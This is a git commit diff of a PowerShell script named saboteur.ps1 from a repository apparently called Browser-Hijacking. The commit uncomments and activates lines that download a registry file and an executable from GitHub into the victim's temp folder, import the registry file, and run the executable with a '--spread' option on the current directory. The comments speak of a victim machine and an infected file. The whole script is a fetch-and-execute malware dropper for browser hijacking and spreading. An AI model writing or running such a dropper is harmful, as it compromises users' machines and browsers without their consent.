ae04d1efe5eda1f93699fddd1fc56efeb2882852
icesonata <hoanglong1622000@gmail.com>
2021-07-21 18:59:23 +0700

    release code

--- saboteur.ps1
+++ saboteur.ps1
@@ -1,12 +1,12 @@
 # Download reg file and store on victim machine:
-powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/raw/main/ieconf.reg', '$env:tmp\\ieconf.reg')}"
+powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO', '`"$env:tmp/ieconf.reg`"')}"
 
 # Download exe file for patching the infected file
-#powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/raw/main/patcher.exe', '$env:tmp\\patcher.exe')}"
+powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/blob/main/patcher_v67.exe?raw=true', '`"$env:temp/patcher.exe`"');}"
 
 # Import reg file into registry
-# powershell -command "&{reg import $env:temp\\ieconf.reg}"
+powershell -command "&{reg import $env:temp\\ieconf.reg}"
 
 # Execute patching file
-#powershell -command "&{. $env:temp\\patcher.exe --spread (Get-Item .).FullName}"
+powershell -command "&{. $env:temp\\patcher.exe --spread (Get-Item .).FullName}"
 
